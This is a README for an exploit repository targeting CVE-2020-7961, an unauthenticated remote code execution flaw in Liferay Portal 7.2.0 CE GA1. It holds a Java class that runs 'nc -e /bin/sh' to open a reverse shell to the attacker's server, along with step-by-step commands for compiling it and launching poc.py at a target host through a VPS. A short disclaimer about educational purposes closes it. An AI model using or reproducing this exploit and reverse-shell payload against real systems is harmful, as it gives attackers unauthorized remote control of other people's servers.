# CVE-2020-7961-POC

POC for Unauthenticated Remote code execution via JSONWS (LPS-97029/CVE-2020-7961) in Liferay 7.2.0 CE GA1 
Based on https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html research

**POC author:** mzero (local Exploitation)
**POC compiled for Remote Exploitation:** @pandaonair

## Installation:
```
pip install -r requirements.txt
```

## Usage:

Edit the Java class with the desired command that you want to execute on the server side.

For instance, if you want to get a remote shell to your server at IP address `<server_ip_address>` on port number `<port_number>` then edit the LifExp.java as follows

```
public class LifExp {

	static {
		try {
			String[] cmd = {"bash", "-c", "nc -e /bin/sh <server_ip_address> <port_number>"};
			java.lang.Runtime.getRuntime().exec(cmd).waitFor();
		} 
		catch ( Exception e ) {
			e.printStackTrace();
		}
	}
}
```

Compile it using javac

```
javac LifExp.java
```

And then execute the `poc.py` script as follows:

```
python poc.py -l 10.160.0.4 -s <server_ip_address> -p 8080 -t <target_ip_address>
```
where,

`-l 10.160.0.4` is your local machine's IP address.

`-s  <server_ip_address> is your VPS's or server's ip address`

`-p 8080` is the port at which you want to run your python http server.

`-t <target_ip_address>` is the target that is running the vulnerable version of Liferay.

Keep in mind that you should exploit this only with your VPS where the local ports are forwarded to internet. Also open the 8080 or any port that you are using in the firewall.


Moreover, place `poc.py` and `LifExp.class` in the same directory. 


**Note:** All the information provided in this Repository are for educational purposes only. The site and the authors of the repository is no way responsible for any misuse of the information.
